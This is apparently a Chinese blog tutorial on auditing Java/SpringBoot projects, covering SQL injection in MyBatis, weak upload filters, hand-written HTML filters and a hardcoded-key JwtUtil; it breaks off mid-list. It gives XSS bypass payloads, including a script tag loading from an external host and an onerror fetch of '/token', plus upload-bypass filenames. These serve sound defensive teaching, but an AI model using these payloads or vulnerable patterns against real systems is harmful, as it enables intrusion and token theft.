# 拿到一个 SpringBoot 项目，我会怎么做安全审计

## 1. 背景与说明

在学习 Java / SpringBoot 代码审计的过程中，我尝试从简单到复杂，对多个开源项目进行了逐步审计练习，并整理成了一系列审计报告。如果你感兴趣，也可以在我的主页中查看相关内容。

这些项目覆盖了不同的业务复杂度与安全场景，例如：

- **简单 Java Swing 桌面系统**：例如图书管理系统
- **基于 SpringBoot 的 Web 项目**：例如常见的博客系统
- **更复杂的 O2O 业务系统**：例如外卖 / 电商类项目

在这些项目中，OWASP Top 10 中的一些常见漏洞（如`A01:broken access control`；`A03:Security Misconfiguration`；`A04:Cryptographic Failures`等）往往都会出现。

但相比“知道这些漏洞”，更关键的问题是：

- **如何在拿到源码后，有条理地去发现它们？**
- **这些漏洞在 Java / SpringBoot 项目之中是怎样出现的？**

因此，这篇文章将围绕一个核心主题展开：

> **如何在拿到源码后，从 0 开始进行一次完整的 Java 代码审计。**

---

📌 本文适合：

- 刚接触代码审计，不知道从哪里下手的初学者
- 具备一定开发经验，希望从安全角度重新理解项目的开发者

---

⭐ 你需要的前置知识：

在阅读本文之前，不需要具备非常深入的安全或开发经验，但具备以下基础会更容易理解：

- **基本的 Web 漏洞知识**  
  例如：XSS、CSRF、文件上传漏洞、SQL 注入（SQLi）、SSRF 等

- **基本的 Java 语法**  
  能够看懂类、方法、参数传递，以及简单的业务逻辑

- **基本的 SpringBoot 结构**  
  了解 controller / service / mapper（dao） 的基本分层

- **基础的后端安全常识**  
  例如：认证与授权的区别、敏感数据不应明文存储、不要信任前端输入等  

- **基本的数据库访问方式（MyBatis / JDBC）**
  - 了解 SQL 是如何被构造和执行的
  - 知道预编译（PreparedStatement）与字符串拼接的区别  

📌 如果以上内容有部分不熟悉，也不影响阅读，可以在遇到具体问题时再补充学习。

👋 本文更偏“带你走一遍审计流程”，而不是对每一个漏洞进行深入讲解。

---

>**特别提醒**：本文内容主要讲述的是一种审计的“起步方式”，并不代表代码审计的全部内容。
>这也意味着，完成文中所有步骤，并不能保证项目绝对安全。具体情况仍需根据不同业务场景进行分析。

---

## 2. 整体审计流程概览

🔎 现在，一个项目源码摆在我们面前，我们应该从哪里开始？

❓️ 是去找一个 XSS？一个 CSRF？还是 SQL 注入？然后想办法“打穿”它？

但问题在于：如果只是随机去找漏洞，这个过程往往依赖经验甚至运气，也很难复现和总结。

❓️ 那么，有没有一种方式，可以让这个过程更加**稳定、可重复**？

*换句话说，我们是否可以通过一套合理的流程，尽可能系统性地发现代码中不合理的设计，而不是因为路径不同而产生遗漏？*

基于我个人的一些审计实践，我通常会按照如下步骤展开分析：

1. 从项目结构入手，快速了解系统的分层结构与业务模块划分
2. 查看配置类，分析全局配置与安全基线，判断系统是否具备基本的安全防护能力
3. 梳理认证与权限机制，明确用户身份是如何建立与校验的
4. 查看数据库与数据存储方式，关注敏感数据与潜在注入风险
5. 检查工具类实现，提前识别系统中可能存在的“漏洞能力”（如文件上传、XSS、SSRF 等）
6. 重点审计 Controller 层业务逻辑，结合前面发现的问题，分析接口是否存在可利用的安全风险

📌 值得注意的是：

- 在实际分析过程中，并发问题、日志记录、敏感信息泄露等，并不会单独作为一个阶段，而是会在审计具体业务接口时一并关注
- 关于第 5 步和第 6 步，不同的人可能会有不同的顺序偏好
例如：
  - 可以先从 Controller 入手，明确接口调用了哪些工具类，再回头分析这些工具类是否存在安全问题（更偏“审计视角”）
  - 也可以先分析工具类，提前掌握系统具备的“攻击能力”，再在 Controller 中寻找触发点，从而构造攻击链（更偏“攻击视角”）

我认为这两种方式都是合理的，可以根据个人习惯选择。



**⭐ 在接下来的内容中，这些步骤将被逐一展开，并结合具体示例进行说明。**

需要说明的是，本文重点在于**审计思路的梳理**，而非具体工具的使用。因此，你可以：

- 通过手工方式进行代码审计
- 使用静态分析工具（如 Semgrep）
- 或结合动态分析工具、甚至 AI 辅助工具

来完成整个审计过程。

---

## 3. 核心审计流程

### 3.1 从项目结构入手建立整体认知（项目入口）

——通俗来说，就是先看一眼项目的整体目录结构，弄清楚每一部分大致是做什么的，以及后续我们应该重点关注哪些位置。

那么，一个典型的 Java / SpringBoot 项目大概长什么样子？这里我通过两个初学者项目来简单说明。


#### 3.1.1 BigEvent：一个较为常见的 Java / SpringBoot 教学项目


下面是它的整体结构。

```
BigEvent-main                         # 项目根目录（前后端分离项目）
│
├── big-event-backend                # 后端项目（Spring Boot）
│   │
│   ├── com.itheima.bigevent        # Java 主包（所有代码入口）
│   │   │
│   │   ├── controller              # 控制层：接收前端请求，返回响应（接口入口）
│   │   ├── service                 # 业务层：处理业务逻辑（核心处理）
│   │   ├── mapper                  # 数据访问层：操作数据库（MyBatis接口）
│   │   ├── pojo                    # 实体类：封装数据（如User、Article等）
│   │   │
│   │   ├── config                  # 配置类：Spring配置（如拦截器注册、跨域等）
│   │   ├── interceptor             # 拦截器：登录校验、权限控制等
│   │   ├── exception               # 异常处理：统一异常返回（全局异常处理）
│   │   ├── validation              # 参数校验：表单/接口参数校验规则
│   │   ├── anno                    # 自定义注解：配合校验或权限使用
│   │   ├── utils                   # 工具类：通用工具（JWT、日期、加密等）
│   │   │
│   │   └── BigEventApplication.java  # 启动类（Spring Boot 入口）
│   │
│   └── resources                   # ⭐ 资源目录
│       │
│       ├── application.yml         # 核心配置文件（端口、数据库、JWT等）
│       ├── application-dev.yml     # 开发环境配置（可选）
│       ├── application-prod.yml    # 生产环境配置（可选）
│      
├── big-event-frontend             # 前端项目（Vue + Vite）
│   │
│   ├── src                        # ⭐ 前端核心源码目录
│   │   │
│   │   ├── views                  # 页面组件（用户看到的页面）
│   │   ├── api                    # 接口封装（axios请求后端）
│   │   ├── router                 # 路由管理（页面跳转控制）
│   │   ├── stores                 # 状态管理（Pinia/Vuex，全局数据）
│   │   ├── utils                  # 工具函数（格式化、token处理等）
│   │   ├── assets                 # 静态资源（图片、样式等）
│   │   │
│   │   ├── App.vue                # 根组件（所有页面的入口组件）
│   │   └── main.js                # 项目入口（创建Vue实例）
│   │
│   ├── vite.config.js             # ⭐ Vite配置文件（开发服务器+代理）
│   │                              # 👉 解决前后端跨域（最关键配置）
│   │
│   ├── package.json               # 项目依赖配置（npm包管理）
│   ├── package-lock.json          # 依赖锁定文件
│   ├── index.html                 # 页面入口HTML（挂载Vue）
│   └── node_modules/              # npm依赖（自动生成）
│


```

**① 分析项目结构**

从结构上可以很明显看出，这是一个基于 SpringBoot + Vue 的**前后端分离项目**。

➡️ 看到这一点，其实就已经可以提高警惕了：

前后端分离架构中，常见的安全问题包括：

- 未授权访问（接口权限控制不严）
- Token 泄露或伪造
- XSS（前端渲染不当导致）
- CSRF（在配置不当的情况下）

这也意味着，在后续的审计过程中，我们需要重点关注这些问题是否被妥善处理。

**② config**

`/big-event-backend/com.itheima.bigevent/config`

这个包中主要存放后端的各类配置类，例如：

- Web 相关配置（路径映射、拦截器等）
- 安全相关配置（认证、权限、过滤器等）
- 跨域（CORS）配置
- 请求处理规则等

从代码审计的角度来看，这一部分非常重要，因为它直接决定了：

👉 **哪些请求可以进入系统，以及这些请求在进入业务逻辑之前会经过哪些安全校验。**

换句话说，这一层是在“接口被调用之前”的第一道控制线：
- 是否允许跨域访问
- 是否需要认证
- 是否存在拦截器进行校验
- 是否关闭了某些安全机制（如 CSRF）

因此，在审计时，可以优先通过配置类快速判断：

> 当前系统的整体安全基线是严格的，还是相对宽松甚至存在缺失。

这里需要简单关注一下项目的安全控制方式：

是通过实现 `WebMvcConfigurer` 等方式进行自定义拦截，还是基于 Spring Security 来实现统一的安全控制。

一般来说，如果是前者，更容易因为拦截不全或逻辑分散而出现问题；如果是后者，则需要关注配置是否合理，例如是否存在不必要的放行（`permitAll`）等。

这一部分在后续会结合具体代码进行详细分析。



**③ mapper**

`/big-event-backend/com.itheima.bigevent/mapper`

这一层通常用于与数据库进行直接交互。在一些项目中，也可能被进一步细分，放在 `dao` 包之下。

从审计的角度来看，这一层主要关注数据是如何被查询和拼接的。

例如：

- 对于基于 MyBatis 实现的项目，需要重点关注是否存在不安全的 `${}` 使用，这往往可能导致 SQL 注入问题

- 对于使用 MyBatis-Plus 的项目，虽然底层仍通过 Mapper 层访问数据库，但部分查询条件可能在 service 层构建（如 Wrapper）。因此，在审计时需要结合业务代码一起分析
相比之下，MyBatis-Plus 出现注入风险的概率相对较低，但并非不存在。例如：
  - Wrapper 条件拼接不当
  - 与 MyBatis 混用时（在一些大型项目之中是常见的），手写 SQL 仍然存在 `${}` 风险
  - 动态条件可能带来的逻辑绕过问题
- 更需要警惕的是一些老项目中直接使用 JDBC 的情况。如果开发者安全意识不足，容易出现“伪预编译”（字符串拼接 SQL）的情况，此时需要逐条检查 SQL 语句的构造方式  

**④ controller / service（接口与业务逻辑）**

controller 层是系统的接口入口，而 service 层则承载具体的业务逻辑实现。两者通常需要结合起来一起分析。

从流程上看：

- controller 负责接收请求、参数处理与简单校验
- service 负责具体的业务执行与数据操作

👉 因此，用户“能调用什么接口”，以及“调用后实际能做什么”，是由这两层共同决定的。

从审计的角度来看，这一部分是整个系统中最核心的分析区域，大部分漏洞都会在这里体现。

常见需要关注的问题包括：
- **水平越权**（如通过修改 ID 访问他人数据，对象级访问控制失效）
- **垂直越权**（普通用户调用管理员接口）
- **权限校验缺失或不一致**（controller 有校验，但 service 未校验，或反之）
- **过度信任前端传参**

同时，在分析时还需要结合具体业务逻辑，例如：
- 操作是否基于当前登录用户，而不是前端传入的用户信息
- 是否存在批量操作、数据遍历等风险点
- 关键业务（如下单、支付、修改权限）是否存在逻辑缺陷

这一部分是整个审计过程的核心。一般会先从 controller 层的接口入手，顺着调用链进入 service 层，分析具体业务逻辑的实现，从而判断是否存在可被利用的逻辑漏洞。

**⑤ utils**

这一层在一些项目中也可能被称为 `common`，或者被放`common`包下，主要用于存放通用工具类。例如：

- 文件上传工具类（如常见的小项目中封装的 OSS 上传逻辑）
- HTML 过滤工具类
- JWT 相关工具类
- ThreadLocalUtil 等上下文工具

从审计角度来看，这一层往往决定了系统是否具备某些“潜在漏洞能力”。例如：
- 文件上传是否缺乏校验，可能导致任意文件上传
- HTML 过滤是否不完整，可能导致 XSS
- Token 处理是否存在问题，可能影响认证安全

👉 因此，这一层不一定直接暴露漏洞，但会影响漏洞“是否能够成立”。

在实际分析中，需要结合 controller 提供的接口一起看：
- 这些工具类是否被用户可控的接口调用
- 是否可以通过这些实现不当的工具，构造攻击链（如提权、信息泄露等）

**⑥ 后端模块其他值得关注的地方**
除了上述核心模块外，后端中还有一些容易被忽略但同样重要的部分，也需要简单关注：
- `application.yml` 等配置文件
  - 可能涉及数据库连接池、线程池、限流等配置
  - 这些配置会直接影响系统在高并发或 DoS 场景下的可用性
- `interceptor`（拦截器）
  - 常用于权限控制、登录校验等
  - 需要关注拦截路径是否完整、是否存在绕过或遗漏
- `pojo`（或 `entity`）
  - 定义了系统中存储和传输的数据结构
  - 需要关注是否包含敏感信息（如密码、手机号等）
  - 以及在存储或返回时是否进行了加密或脱敏处理

**⑦ 前端模块**

虽然常说“后端不应信任前端”，但前端的实现同样会影响漏洞是否能够成立，因此也需要简单关注。

主要可以看以下几点：

- 前端配置（如 `vite.config.js`）
- 是否存在富文本渲染（如 `v-html`、`innerHTML` 等）
- 是否有过滤机制（如 DOMPurify）
- Token 的存储方式（如放在 Cookie 中可能带来 CSRF 风险）

> 📌 前端部分本文不做深入展开，后续会结合具体场景简单说明。


#### 3.1.2 Sky Take Out：一个较为常见的 Java / SpringBoot 外卖小程序教学项目

在 3.1.1 中，我们已经介绍了常见项目结构以及需要重点关注的模块。在这个项目中，整体结构并没有本质变化，但**分层更加清晰、模块拆分更加细致**。


```
sky-take-out-main
├── .vscode
├── demo
├── sky-common
│   └── src/main/java/com/sky
│       ├── constant        // 常量类
│       ├── context         // 上下文（如ThreadLocal等）
│       ├── enumeration     // 枚举类
│       ├── exception       // 自定义异常
│       ├── json            // JSON处理
│       ├── properties      // 配置属性类
│       ├── result          // 返回结果封装
│       └── utils           // 工具类
│
├── sky-pojo
│   └── src/main/java/com/sky
│       ├── dto             // 数据传输对象（接收前端参数）
│       ├── entity          // 实体类（数据库表映射）
│       └── vo              // 视图对象（返回给前端）
│
└── sky-server
    └── src/main/java/com/sky
        ├── annotation      // 自定义注解
        ├── aspect          // AOP切面
        ├── config          // 配置类（Spring配置等）
        ├── controller      // 控制层
        ├── handler         // 处理器（如全局异常处理）
        ├── interceptor     // 拦截器
        ├── mapper          // MyBatis接口
        ├── service         // 业务逻辑层
        ├── task            // 定时任务
        ├── websocket       // WebSocket相关
        └── SkyApplication  // 启动类
```

主要的不同点在于：

- 将通用能力单独拆分为 `sky-common` 模块
  - 包含工具类、常量、上下文（ThreadLocal）、返回封装等
  - ⭐ 审计时需要额外关注这些“公共能力”是否被不当使用，例如一些默认密码、通用逻辑可能会在这一层定义

- 将数据结构单独拆分为 `sky-pojo` 模块
  - 明确区分 `dto`（输入）、`entity`（数据库）、`vo`（输出）
  - ⭐ 更方便梳理数据流向，但也需要关注数据在不同层之间传递时，是否进行了必要的校验与过滤

- 核心业务集中在 `sky-server` 模块
  - 包含 controller / service / mapper 等典型结构
  - 同时引入了 AOP、拦截器、WebSocket、定时任务等机制
  - ⭐ 审计范围更广，不仅需要关注接口本身，还需要注意切面、任务等“非直接入口”的执行逻辑

总体来说，相比 3.1.1，这类项目：

 结构更加规范的项目，往往也意味着逻辑被拆分得更加分散。在审计时，需要花费更多精力跨模块跟踪调用链进行分析，否则容易遗漏细节，从而产生误判。

> 一个典型的例子是审计日志（这里指系统自身记录的操作日志）：相关信息（如操作人）的填充，可能是在 AOP 中统一完成的，而不是直接出现在 controller 或 service 层。因此，不能仅凭这两层代码中“没有体现”就判断审计日志存在缺失。

### 3.2 全局配置与安全基线（配置类）





### 3.3 认证与权限机制（登录接口 + 权限控制代码）


### 3.4 数据库与数据安全（DAO层 / Mapper / Repository）

谈到数据库，值得令我们关注的，就是数据库注入问题。我们暂且以三种案例进行讨论：

**（1）MyBatis**

在使用 MyBatis 时，从审计角度来看，应重点关注参数绑定方式：

- `#{}`：表示预编译参数绑定（PreparedStatement），**安全**
- `${}`：表示字符串拼接，**存在 SQL 注入风险**

✅ 正确使用方式：
```java
@Select("SELECT * FROM address_book WHERE id = #{id}")
````

❌ 错误使用方式：
```java
@Select("SELECT * FROM address_book ORDER BY ${column}")
```
`${}` 会将参数直接拼接进 SQL，如果参数来源于用户输入，则可能导致 SQL 注入。

一般情况下，项目中应尽量避免使用 `${}`。但需要注意的是，在 `ORDER BY` 场景中：

- 字段名无法使用 `#{}` 绑定
- **只能使用 `${}` 进行拼接**

因此，这种场景应该尤为关注：
- `${}` 的参数是否来源于用户输入
- 是否对字段值做了限制（如白名单）
- 是否存在直接透传参数的情况

安全的使用是（白名单限制）：

```java
public String getOrderByColumn(String column) {
    List<String> whitelist = Arrays.asList("id", "name", "create_time");
    if (whitelist.contains(column)) {
        return column;
    }
    return "id";
}
```

```java
@Select("SELECT * FROM address_book ORDER BY ${column}")
List<AddressBook> list(@Param("column") String column);
```

```java
String safeColumn = getOrderByColumn(userInput);
mapper.list(safeColumn);
```


**(2) Mybatis Plus**

SQL风险相对更少但值得注意：

**① Wrapper 条件拼接不当**

一般情况下，像下面这种写法是安全的：
```java
LambdaQueryWrapper<User> wrapper = new LambdaQueryWrapper<>();
wrapper.eq(User::getId, id);
userMapper.selectList(wrapper);
```

这是因为`eq()`中的参数会作为预编译参数处理，不会直接拼接进 SQL。
但如果开发者错误地把用户输入当作 SQL 片段使用，就可能出现风险。例如：
```java
QueryWrapper<User> wrapper = new QueryWrapper<>();
wrapper.last("limit " + userInput);
userMapper.selectList(wrapper);
```

`last()`的内容会被直接拼接到 SQL 语句末尾，不会进行参数预编译。
如果`userInput`可控，则可能带来 SQL 注入问题。

**② 使用`apply()`、`inSql()`、`exists()`等方法时直接拼接参数**

MyBatis Plus 提供了一些用于拼接原生 SQL 片段的方法，这些方法在审计中应重点关注：
- `last()`
- `apply()`
- `inSql()`
- `notInSql()`
- `exists()`
- `notExists()`

例如下面的写法就存在风险：

```java
QueryWrapper<User> wrapper = new QueryWrapper<>();
wrapper.apply("date_format(create_time,'%Y-%m-%d') = '" + userInput + "'");
userMapper.selectList(wrapper);
```

**③ 动态条件可能带来的逻辑绕过问题**

除了传统意义上的 SQL 注入外，MyBatis Plus 还需要关注一种比较常见的问题：动态条件控制不严，导致查询逻辑被绕过。

```java
LambdaQueryWrapper<User> wrapper = new LambdaQueryWrapper<>();
wrapper.eq(User::getStatus, 1);

if (StringUtils.isNotBlank(name)) {
    wrapper.like(User::getName, name);
}
```
这种写法本身不一定会导致 SQL 注入，但如果业务中过于依赖前端传参控制查询条件，就可能出现：
- 原本应限制的数据范围被放宽
- 某些查询条件缺失后返回全部数据
- 通过构造特殊参数绕过业务过滤逻辑

**④ 与 MyBatis 混用时，手写 SQL 仍然存在 ${} 风险**

这一点参考（1）的部分


**(3) 预编译**

一个误区是使用了预编译就一定没有SQL注入的风险，原因在于一些开发者可能误用预编译，导致为预编译

```java
            String sql = "update book set book_id='"+val1+"', "
                    + "stock='"+val2+"' where book_id='"+val1+"'";
            ps = con.prepareStatement(sql);
```

在这个案例之中，虽然使用了`prepaStatement`，但是sql语句本身还是拼接的。

安全的使用是
```java
        String sql = "select * from student where student_id=?";
        try {
            ps = con.prepareStatement(sql);
            ps.setString(1, txtsid.getText());
            rs = ps.executeQuery();
```

### 3.5 工具类（文件上传 / HTML过滤 / JWT等）

在这一步里，我来举几个开源教学项目之中最常出现的漏洞。分析存在漏洞的写法和安全的写法（或说修复方案）


#### 3.5.1 文件上传

这是一个基于阿里OSS的文件上传工具类，观察这个代码，问题在哪里？

```java

@Data
@AllArgsConstructor
@Slf4j
public class AliOssUtil {

    private String endpoint;
    private String accessKeyId;
    private String accessKeySecret;
    private String bucketName;

    /**
     * 文件上传
     *
     * @param bytes
     * @param objectName
     * @return
     */
    public String upload(byte[] bytes, String objectName) {

        // 创建OSSClient实例。
        OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret);

        try {
            // 创建PutObject请求。
            ossClient.putObject(bucketName, objectName, new ByteArrayInputStream(bytes));
        } catch (OSSException oe) {
            System.out.println("Caught an OSSException, which means your request made it to OSS, "
                    + "but was rejected with an error response for some reason.");
            System.out.println("Error Message:" + oe.getErrorMessage());
            System.out.println("Error Code:" + oe.getErrorCode());
            System.out.println("Request ID:" + oe.getRequestId());
            System.out.println("Host ID:" + oe.getHostId());
        } catch (ClientException ce) {
            System.out.println("Caught an ClientException, which means the client encountered "
                    + "a serious internal problem while trying to communicate with OSS, "
                    + "such as not being able to access the network.");
            System.out.println("Error Message:" + ce.getMessage());
        } finally {
            if (ossClient != null) {
                ossClient.shutdown();
            }
        }

        //文件访问路径规则 https://BucketName.Endpoint/ObjectName
        StringBuilder stringBuilder = new StringBuilder("https://");
        stringBuilder
                .append(bucketName)
                .append(".")
                .append(endpoint)
                .append("/")
                .append(objectName);

        log.info("文件上传到:{}", stringBuilder.toString());

        return stringBuilder.toString();
    }
}
```

很显然，这个工具类仅完成了一件事，就是文件上传。

❓️ 它有没有做什么？
- 判断文件的类型 
- 限制文件大小 
- 校验文件内容 
- 对文件名（objectName）进行过滤或规范化 

也就是说，这个工具类本身是一个**纯功能实现**，而不是一个**安全实现**。

🔎 这意味着什么？

如果上层（controller）没有做额外校验，那么用户可以上传任意内容：
- 可执行脚本文件（如 `.jsp`、`.html` 等）
- 带有恶意内容的文件（如 XSS payload）
- 超大文件（造成存储或带宽消耗）

此外，`objectName` 由外部传入且未经过处理，也可能带来一些问题，例如：
- 覆盖已有文件
- 构造特殊路径（如目录穿越风格的命名）
- 通过文件名直接影响访问 URL

**另一个，关键问题是，这个工具类，本身是否有漏洞吗？是否会形成攻击链？**

这取决于后续在controller / service层，它是怎样被提供给用户的。

即后续需要重点关注：
- **什么权限的用户可以调用该功能？**
  - 一个比较危险的思路是，将后台操作者默认视为“可信对象”，认为只要工具类不直接暴露给普通用户，即使实现不安全也是可以接受的
  - 实际上，即便只对后台开放，这类不安全的工具能力依然应该被修复，因为一旦发生越权或账号被利用，风险会被进一步放大
- **调用处是否进行了文件上传校验？**
  - 通常来说，即使在 controller / service 层根据业务需求存在不同的校验逻辑，在 utils 层也应具备一些基础的通用防护（如文件大小限制、文件名规范化等）
  - 如果 utils 层完全没有任何限制，那么很可能上层也没有进行严格校验，这种情况需要重点关注
- **上传后的文件是否可以被直接访问？**
  - 在一些常见的小项目中（如用户头像、商品图片等场景），上传后的文件往往可以通过 URL 直接访问
  - 如果上传内容未经过校验，这将可能导致 XSS，甚至在特定情况下形成进一步的攻击链（如结合前端渲染问题）


❓️ **又一个问题，写了过滤就一定安全吗？**

并非如此。做过渗透的小伙伴会知道，一些文件上传漏洞，恰恰就来源于——**“看起来做了过滤，但实际上过滤不充分”**。

下面是几个常见的错误示例：

**① 只通过后缀判断文件类型**
```java
if (!fileName.endsWith(".jpg")) {
    throw new RuntimeException("只允许上传jpg图片");
}
````
- 可以通过双后缀绕过：`shell.jsp.jpg`
- 或大小写绕过：`shell.JPG`

👉 本质问题：仅依赖字符串判断，不可靠

**② 简单黑名单过滤**
```java
if (fileName.contains(".jsp") || fileName.contains(".php")) {
    throw new RuntimeException("非法文件");
}
```
- 依旧可以绕过：
  - `shell.jsp;.jpg`
  - `shell.jsp%00.jpg`
  - `shell.jsp .jpg`

👉 黑名单永远不完整

**③ 只校验 Content-Type**
```java
if (!file.getContentType().equals("image/jpeg")) {
    throw new RuntimeException("只允许上传图片");
}
```
- Content-Type 可被伪造（例如使用burp suite篡改报文）
- 攻击者可以上传任意文件并伪装为图片

👉 本质：信任客户端数据
>题外话，尝试使用burp suite拦截报文并修改，可以帮助我们更好的理解，哪些前端数据不可信，为什么不可信

**④ 只检查文件头（但不完整）**
```java
byte[] bytes = file.getBytes();
if (bytes[0] != (byte)0xFF || bytes[1] != (byte)0xD8) {
    throw new RuntimeException("非法图片");
}
```
- 只检查前几个字节，可以构造“图片马”
- 后面仍然可以嵌入恶意代码

**⑤ 文件名未规范化**
```java
ossUtil.upload(fileBytes, fileName);
```
- 攻击者可控 `fileName`
- 可能导致：
  - 覆盖文件
  - 构造特殊路径
  - 注入恶意URL

📚 值得注意的是，大多数初学者自行编写的过滤逻辑往往并不可靠。

在实际开发中，更推荐使用经过验证的成熟安全库来完成相关功能，例如：
- 文件类型检测：
  - `Apache Tika`（基于文件内容识别类型）
  - `java.nio.file.Files.probeContentType()`
- 文件上传安全处理：
  - Spring 提供的 `MultipartFile` 配合服务端校验
  - 结合白名单策略（允许的类型、大小等）

在此基础上，仅针对具体业务需求进行必要的定制，而不是从零开始自行实现过滤逻辑。

同时，即使使用成熟库，也应关注其使用方式是否正确，并结合实际场景进行审计。

#### 3.5.2 HTML 过滤工具类

本质上，这一类问题与文件上传类似，甚至可以类比密码算法的设计原则：

👉 **涉及复杂规则的安全处理，应尽量使用经过验证的成熟实现，而不是自行编写（哪怕是AI写也不建议，AI只建议基于专业库写补充规则）。**

在实际项目中，HTML 过滤通常存在以下三种情况：
- **完全没有过滤机制**
  - 这种情况下，需要重点关注 controller / service 层是否存在富文本相关功能（如评论、文章等），这些场景是 XSS 的高发区域
  - 如果项目中没有涉及富文本，相对问题不大；如果存在，则需要进一步结合前端渲染方式一起分析
- **手写过滤规则**
  - 这种情况通常风险较高
  - 常见问题包括：规则不完整、正则误用、未考虑绕过方式等
  - 在审计时，可以将过滤逻辑交给大模型或工具辅助分析，快速定位潜在绕过点
- **使用专业库或函数**
  - 相对安全，但仍需关注是否存在误用
  - 例如：配置不当、过滤策略过宽，或与业务逻辑存在冲突

这里我也从简单到复杂，举几个手写HTML过滤规则被绕过的例子

**① 只过滤 `<script>` 标签**
```java
content = content.replaceAll("<script>", "");
content = content.replaceAll("</script>", "");
```
绕过方式：
```html
<ScRiPt>alert(1)</ScRiPt>
<script src=//xss.com></script>
<img src=x onerror=alert(1)>
```
问题：
- 大小写绕过
- 只过滤 script，忽略其他可执行标签

**② 使用简单正则删除标签**
```java
content = content.replaceAll("<.*?>", "");
```
绕过方式：
```html
<<script>alert(1)//<</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
```
问题：
- 正则无法正确解析嵌套HTML结构
- 很容易被构造绕过

**③ 只过滤关键字（黑名单）**
```java
if (content.contains("script")) {
    throw new RuntimeException("非法内容");
}
```
绕过方式：
```html
<scriPt>alert(1)</scriPt>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```
问题：
- 黑名单不完整
- HTML执行方式远不止 script

**④ 只过滤事件属性（但不全面）**
```java
content = content.replaceAll("onerror", "");
content = content.replaceAll("onload", "");
```
绕过方式：
```html
<img src=x oNerror=alert(1)>
<svg oNlOad=alert(1)>
```
问题：
- 大小写绕过
- 事件种类很多（onclick、onmouseover 等）


还有很多，比如错误过滤 javascript 协议，远不止这些。博客里所写的这些，并不是需要你逐条对照着看，只是讲解为什么过滤了也不行。
真正审计的时候，还是推荐AI辅助来判断这一部分规则。

一个复杂的例子是这样的。
```java
public class HTMLUtil {

    /**
     * 删除文章内的markdown
     *
     * @param source 需要过滤的文本
     * @return 过滤后的内容
     */
    public static String deleteArticleTag(String source) {
        //删除HTML和markdown标签
        source = source.replaceAll("!\\[\\]\\((.*?)\\)", "").replaceAll("<[^>]+>", "");
        return deleteTag(source);
    }

    /**
     * 删除评论内容标签
     *
     * @param source 需要进行剔除HTML的文本
     * @return 过滤后的内容
     */
    public static String deleteCommentTag(String source) {
        //保留图片标签
        source = source.replaceAll("(?!<(img).*?>)<.*?>", "");
        return deleteTag(source);
    }

    /**
     * 删除标签
     *
     * @param source 文本
     * @return 过滤后的文本
     */
    private static String deleteTag(String source) {
        //删除转义字符
        source = source.replaceAll("&.{2,6}?;", "");
        //删除script标签
        source = source.replaceAll("<[\\s]*?script[^>]*?>[\\s\\S]*?<[\\s]*?\\/[\\s]*?script[\\s]*?>", "");
        //删除style标签
        source = source.replaceAll("<[\\s]*?style[^>]*?>[\\s\\S]*?<[\\s]*?\\/[\\s]*?style[\\s]*?>", "");
        return source;
    }
}
```
❓️ 逐条比对去分析它？寻找绕过的可能？

这是一件很复杂的事情，有些时候，开发者写的奇奇怪怪的过滤规则远不止这些。一条一条地去看正则是低效率的。
当然，正则过滤其实本身就是一个信号——HTML不适合正则过滤，这意味着，使用正则过滤，很可能是不充分的。

>PS:从编译原理的角度来说，HTML 属于包含嵌套结构的上下文无关文法，而正则表达式只能处理线性的正则文法。
> 用低维的工具去解析高维的结构，在数学模型上就注定了会有无数的绕过漏洞。

这个例子很显然看似过滤充分，但有许多绕过的可能：
- `<scr<script>ipt>alert(1)</scr</script>ipt>`
- `<<script>alert(1)//<</script>`
- `<img src=x onerror=alert(1)>`
- `<img src=1 onerror=fetch('/token')>`
- `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`
- `<scr![]()ipt>alert(1)</script>`
- ...

在AI赋能的语义下，攻击者可以在短时间低成本内构造出大量的绕过方案。当然，你也可以通过AI辅助，分析出大量绕过的可能。

👉 这个例子问题的本质在于：
- 使用正则表达式处理 HTML（不可行）
- 过滤顺序不合理（先删标签再删 script）
- 仅关注标签，忽略属性（如 onerror）
- 错误处理 HTML 实体（删除而非解析）
- 黑名单策略不完整

最后，推荐的方案是：
- `OWASP Java HTML Sanitizer`
- `jsoup.clean()`
- `DOMPurify`（前端）


#### 3.5.3 JwtUtil工具类

这是一个典型的JwtUtil，观察这个代码，问题在哪里？

```java
public class JwtUtil {

    private static final String KEY = "itheima";

    //接收业务数据,生成token并返回
    public static String genToken(Map<String, Object> claims) {
        return JWT.create()
                .withClaim("claims", claims)
                .withExpiresAt(new Date(System.currentTimeMillis() + 1000 * 60 * 60 * 12))
                .sign(Algorithm.HMAC256(KEY));
    }

    //接收token,验证token,并返回业务数据
    public static Map<String, Object> parseToken(String token) {
        return JWT.require(Algorithm.HMAC256(KEY))
                .build()
                .verify(token)
                .getClaim("claims")
                .asMap();
    }
}
```
首先，这段代码完成了两个功能：
- 生成 Token
- 校验 Token 并解析数据

❓️ 从功能上来说是完整的，但它有没有做什么？
- 密钥是否安全？
- 是否支持密钥管理（如动态配置、轮换）
- 是否区分不同 Token 类型（如用户 / 管理员）
- 是否考虑 Token 失效控制（如主动失效、黑名单）

**问题一：密钥硬编码**
```java
private static final String KEY = "itheima";
````
- 密钥直接写死在代码中，一旦源码泄露（如开源项目或代码外泄），攻击者可以自行伪造合法 Token
- 密钥强度较低（弱密钥），存在被猜测或暴力破解的风险
- （考虑到这是一个教学项目，这种写法可以理解，但在生产环境中，应使用高强度密钥，并通过配置或密钥管理系统进行管理，一般建议不少于 32 位）

**问题二：Token 内容被完全信任**

```java
.withClaim("claims", claims)
```

- Token 中的业务数据被直接信任使用，但实际上诸如用户 ID、角色等关键字段，仍应在服务端进行校验（如结合数据库）
- 一旦 KEY 泄露，攻击者可以随意构造 claims，从而伪造身份

例如：

```json
{
  "userId": 1,
  "role": "admin"
}
```

👉 如果后端直接基于这些字段进行权限判断，将导致严重的权限绕过问题

**问题三：缺乏额外校验机制**

```java
JWT.require(Algorithm.HMAC256(KEY)).build().verify(token)
```

- 未校验 `issuer`（签发者）
- 未校验 `audience`（受众）
- 未对 Token 类型进行区分（如用户 / 管理员）

这通常指向两种情况：

- 一是系统仅设计了单一角色，这在大多数实际业务中是不合理的，也往往意味着权限模型设计存在缺陷
- 二是系统存在多角色，但共用同一套 Token 机制，这种情况下更容易出现角色之间的越权问题

**问题四：Token 无法主动失效**

```java
.withExpiresAt(...)
```

- 仅依赖过期时间（如 12 小时）控制 Token 生命周期
- 无法支持：
  - 用户主动登出
